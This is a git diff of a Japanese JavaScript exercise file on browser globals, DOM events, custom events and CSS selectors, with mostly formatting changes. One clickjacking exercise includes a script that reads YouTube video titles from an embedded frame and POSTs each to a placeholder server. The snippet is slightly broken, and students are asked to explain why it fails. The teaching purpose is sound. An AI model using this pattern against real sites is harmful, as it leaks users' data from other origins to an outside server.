@@ -70,7 +70,6 @@
 また、ブラウザとnodeのグローバルオブジェクトのプロパティやメソッドを比較し、ブラウザ独自のものを10程度記しなさい。<br>
 最後に、グローバルオブジェクトにundefinedが定義されていることを確認し、過去のES仕様でどのような問題が発生していたかを記しなさい。
 
-
 **出題範囲 15.1.3**
 
 ## 問題 15.1-3.5 💻
@@ -105,14 +104,15 @@ navigator から取得できる要素をページ中に描画して詐欺サイ�
 <script src="./script.js"></script>
 ...
 ```
+
 ```js
-(async () => {
+;async () => {
   // YouTube が利用者に推薦する動画タイトルを取得すれば、利用者に最適な商品セットを表示できるのではないか？
-  const titles = document.getElementById("").contentWindowquerySelectorAll('#video-title');
+  const titles = document.getElementById('').contentWindowquerySelectorAll('#video-title')
   for (const t of titles) {
-    await fetch("your-server-path", { method: "POST", body: t.textContent })
+    await fetch('your-server-path', { method: 'POST', body: t.textContent })
   }
-});
+}
 ```
 
 しかし、トップページを読み込むとエラーになります。用語「クリックジャッキング」を調べて理由を説明しなさい。<br>
@@ -153,7 +153,6 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
 更にscript中のコメント1.～4.の指示に従いカスタムイベントの関連コードを完成させなさい。<br>
 最後にブラウザのデバッグツール(Chromeの場合はDeveloper ToolのEvent Listners)で、btn等に登録されているイベントをそれぞれ確認しなさい。
 
-
 ```html
 <!doctype html>
 <html lang="en">
@@ -162,44 +161,43 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>EVENT propagation, dispatch</title>
     <script type="module">
-      const div = document.querySelector("#div");
-      const btn = document.querySelector("#btn");
+      const div = document.querySelector('#div')
+      const btn = document.querySelector('#btn')
       div.addEventListener(
-        "click",
+        'click',
         () => {
-          console.log("div");
+          console.log('div')
         },
         { capture: true },
-      );
-      btn.addEventListener("click", () => {
-        console.log("button");
-      });
+      )
+      btn.addEventListener('click', () => {
+        console.log('button')
+      })
 
       class RandomEventTarget extends EventTarget {
         constructor() {
-          super();
+          super()
         }
 
         trigger() {
-          const randomNumber = new CustomEvent("random", {
+          const randomNumber = new CustomEvent('random', {
             detail: Math.random(),
-          });
-          this.dispatchEvent(randomNumber);
+          })
+          this.dispatchEvent(randomNumber)
         }
       }
 
-      const randomEventTarget = new RandomEventTarget();
+      const randomEventTarget = new RandomEventTarget()
 
       // 1. htmlのpタグ要素を生成しなさい。また、ボタン要素の直後の位置にpタグ要素を配置しなさい。
 
-      randomEventTarget.addEventListener("random", (e) => {
+      randomEventTarget.addEventListener('random', (e) => {
         // 2. 生成済みのpタグ要素のテキストに、イベントの保持する乱数値を代入しなさい。
-      });
+      })
 
       // 3. ボタンにイベントリスナを追加し、ボタン押下するごとに乱数値を変更しなさい。変更にはRandomEventTargetのtriggerメソッドを利用しなさい。
 
       // 4. RandomEventTargetのtriggerメソッドによってイベントを発生させて、ページ読み込み時に乱数値を表示しなさい。
-
     </script>
   </head>
   <body>
@@ -208,9 +206,7 @@ div 要素とテキスト input 要素が以下のようにイベント処理さ
     </div>
   </body>
 </html>
-
 ```
-
 
 **出題範囲 15.2.1/15.2.4**
 
@@ -262,15 +258,13 @@ index.html に対して以下の要素を CSS セレクタで指定して consol
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Product List</title>
     <script type="module">
-      document
-        .getElementById("category-select")
-        .addEventListener("change", (e) => {
-          const selectedCategory = e.target.value;
-          const products = document.querySelectorAll("#productList li");
-          products.forEach((product) => {
-            // ここにコードを書いて完成させる
-          });
-        });
+      document.getElementById('category-select').addEventListener('change', (e) => {
+        const selectedCategory = e.target.value
+        const products = document.querySelectorAll('#productList li')
+        products.forEach((product) => {
+          // ここにコードを書いて完成させる
+        })
+      })
     </script>
   </head>
   <body>
@@ -281,12 +275,8 @@ index.html に対して以下の要素を CSS セレクタで指定して consol
     </select>
     <ul id="productList">
       <li data-testid="food1" data-category="food">お菓子 - ¥1000</li>
-      <li data-testid="stationery1" data-category="stationery">
-        消しゴム - ¥200
-      </li>
-      <li data-testid="stationery2" data-category="stationery">
-        ものさし - ¥300
-      </li>
+      <li data-testid="stationery1" data-category="stationery">消しゴム - ¥200</li>
+      <li data-testid="stationery2" data-category="stationery">ものさし - ¥300</li>
     </ul>
   </body>
 </html>
